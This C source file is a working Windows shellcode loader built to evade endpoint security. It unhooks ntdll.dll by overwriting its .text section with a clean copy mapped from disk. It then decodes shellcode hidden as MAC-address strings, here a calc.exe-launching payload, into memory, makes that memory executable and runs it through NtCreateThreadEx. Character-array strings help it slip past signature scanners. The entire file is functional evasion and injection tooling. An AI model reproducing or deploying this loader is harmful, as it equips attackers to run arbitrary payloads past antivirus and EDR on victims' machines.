#include <Windows.h>
#include <stdio.h>
#include <Rpc.h>
#include <winternl.h>
#include <Ip2string.h>
#pragma comment(lib, "ntdll")

#define NtCurrentProcess()	   ((HANDLE)-1)

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

#pragma comment(lib, "Rpcrt4.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define UP -32
#define DOWN 32


EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);



EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

EXTERN_C NTSTATUS NtWaitForSingleObject(
    IN HANDLE         Handle,
    IN BOOLEAN        Alertable,
    IN PLARGE_INTEGER Timeout
);


struct LDR_MODULE {
    LIST_ENTRY e[3];
    HMODULE base;
    void* entry;
    UINT size;
    UNICODE_STRING dllPath;
    UNICODE_STRING dllname;
};


LPVOID getNtdll() {

    char path[] = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0};
    // Get a handle to ntdll
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open a handle to the file (%u)\n", GetLastError());
        return NULL;
    }

    // Open a file mapping object for ntdll
    HANDLE hmapping = CreateFileMappingNumaW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, NULL, NULL, NULL, NUMA_NO_PREFERRED_NODE);
    if (!hmapping) {
        printf("Failed to open a file mapping object to ntdll (%u)\n", GetLastError());
        CloseHandle(hFile);
        return NULL;
    }

    // Maps a view of a file mapping into the address space
    LPVOID pNtdll = MapViewOfFileExNuma(hmapping, FILE_MAP_READ, NULL, NULL, NULL, NULL, NUMA_NO_PREFERRED_NODE);
    if (!pNtdll) {
        printf("Failed to map ntdll (%u)\n", GetLastError());
        CloseHandle(hFile);
        CloseHandle(hmapping);
        return NULL;
    }

    return pNtdll;

}

BOOL Unhook(LPVOID module) {

    char sntdll[] = { 'n','t','d','l','l','.','d','l','l' };
    HANDLE hntdll = GetModuleHandleA(sntdll);

    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((char*)(module)+DOSheader->e_lfanew);
    if (!NTheader) {
        printf(" [-] Not a PE file\n");
        return FALSE;
    }

    PIMAGE_SECTION_HEADER sectionHdr = IMAGE_FIRST_SECTION(NTheader);
    DWORD oldprotect = 0;
    
    for (WORD i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
       
        char txt[] = { '.','t','e','x','t', 0 };

        if (!strcmp((char*)sectionHdr->Name, txt)) {
            BOOL status1 = VirtualProtect((LPVOID)((DWORD64)hntdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!status1) {
                printf("Failed in VirtualProtect1 (%u)\n", GetLastError());
                return FALSE;
            }

            memcpy((LPVOID)((DWORD64)hntdll + sectionHdr->VirtualAddress), (LPVOID)((DWORD64)module + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize);

            BOOL status2 = VirtualProtect((LPVOID)((DWORD64)hntdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!status2) {
                printf("Failed in VirtualProtect2 (%u)\n", GetLastError());
                return FALSE;
            }
        }
        
    }
    return TRUE;
    
}

BOOL isItHooked(LPVOID addr) {
    BYTE stub[] = "\x4c\x8b\xd1\xb8";
    if (memcmp(addr, stub, 4) != 0)
        return TRUE;
    return FALSE;
}


int main() {

    printf("\n\n");

    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))) {
        printf("NtAllocateVirtualMemory Hooked\n");
    }
    else {
        printf("NtAllocateVirtualMemory Not Hooked\n");
    }

    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))) {
        printf("NtProtectVirtualMemory Hooked\n");
    }
    else {
        printf("NtProtectVirtualMemory Not Hooked\n");
    }

    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))) {
        printf("NtCreateThreadEx Hooked\n");
    }
    else {
        printf("NtCreateThreadEx Not Hooked\n");
    }

    printf("\n\n");


    printf("[+] Unhooking Ntd11 \n");
    LPVOID nt = getNtdll();
    if(!nt){
        printf("Failed to map ntd11\n");
        return -1;
    }

    if (!Unhook(nt)) {
        printf("Failed in Unhooking!\n");
        return -2;
    }

   

    PVOID BaseAddress = NULL;
    SIZE_T dwSize = 0x2000;

    const char* MAC[] =
    {
        "FC-48-83-E4-F0-E8",
        "C0-00-00-00-41-51",
        "41-50-52-51-56-48",
        "31-D2-65-48-8B-52",
        "60-48-8B-52-18-48",
        "8B-52-20-48-8B-72",
        "50-48-0F-B7-4A-4A",
        "4D-31-C9-48-31-C0",
        "AC-3C-61-7C-02-2C",
        "20-41-C1-C9-0D-41",
        "01-C1-E2-ED-52-41",
        "51-48-8B-52-20-8B",
        "42-3C-48-01-D0-8B",
        "80-88-00-00-00-48",
        "85-C0-74-67-48-01",
        "D0-50-8B-48-18-44",
        "8B-40-20-49-01-D0",
        "E3-56-48-FF-C9-41",
        "8B-34-88-48-01-D6",
        "4D-31-C9-48-31-C0",
        "AC-41-C1-C9-0D-41",
        "01-C1-38-E0-75-F1",
        "4C-03-4C-24-08-45",
        "39-D1-75-D8-58-44",
        "8B-40-24-49-01-D0",
        "66-41-8B-0C-48-44",
        "8B-40-1C-49-01-D0",
        "41-8B-04-88-48-01",
        "D0-41-58-41-58-5E",
        "59-5A-41-58-41-59",
        "41-5A-48-83-EC-20",
        "41-52-FF-E0-58-41",
        "59-5A-48-8B-12-E9",
        "57-FF-FF-FF-5D-48",
        "BA-01-00-00-00-00",
        "00-00-00-48-8D-8D",
        "01-01-00-00-41-BA",
        "31-8B-6F-87-FF-D5",
        "BB-E0-1D-2A-0A-41",
        "BA-A6-95-BD-9D-FF",
        "D5-48-83-C4-28-3C",
        "06-7C-0A-80-FB-E0",
        "75-05-BB-47-13-72",
        "6F-6A-00-59-41-89",
        "DA-FF-D5-63-61-6C",
        "63-2E-65-78-65-00",
    };
    
    NTSTATUS status1 = NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status1)) {
        printf("[!] Failed in sysZwAllocateVirtualMemory (%u)\n", GetLastError());
        return 1;
    }

    

    int rowLen = sizeof(MAC) / sizeof(MAC[0]);
    PCSTR Terminator = NULL;
    NTSTATUS STATUS;

    DWORD_PTR ptr = (DWORD_PTR)BaseAddress;
    for (int i = 0; i < rowLen; i++) {
        STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[i], &Terminator, (DL_EUI48*)ptr);
        if (!NT_SUCCESS(STATUS)) {
            return FALSE;
        }
        ptr += 6;

    }

    HANDLE hThread;
    DWORD OldProtect = 0;


    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
    if (!NT_SUCCESS(NtProtectStatus1)) {
        printf("[!] Failed in sysNtProtectVirtualMemory1 (%u)\n", GetLastError());
        return 2;
    }


    HANDLE hHostThread = INVALID_HANDLE_VALUE;

    
    NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(NtCreateThreadstatus)) {
        printf("[!] Failed in sysNtCreateThreadEx (%u)\n", GetLastError());
        return 3;
    }


    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;

    
    NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
    if (!NT_SUCCESS(NTWFSOstatus)) {
        printf("[!] Failed in sysNtWaitForSingleObject (%u)\n", GetLastError());
        return 4;
    }

    printf("\n\n");
    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))) {
        printf("NtAllocateVirtualMemory Hooked\n");
    }
    else {
        printf("NtAllocateVirtualMemory Not Hooked\n");
    }

    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))) {
        printf("NtProtectVirtualMemory Hooked\n");
    }
    else {
        printf("NtProtectVirtualMemory Not Hooked\n");
    }

    if (isItHooked(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))) {
        printf("NtCreateThreadEx Hooked\n");
    }
    else {
        printf("NtCreateThreadEx Not Hooked\n");
    }

    
    printf("\n\n[+] Finished !!!!\n");

    return 0;

}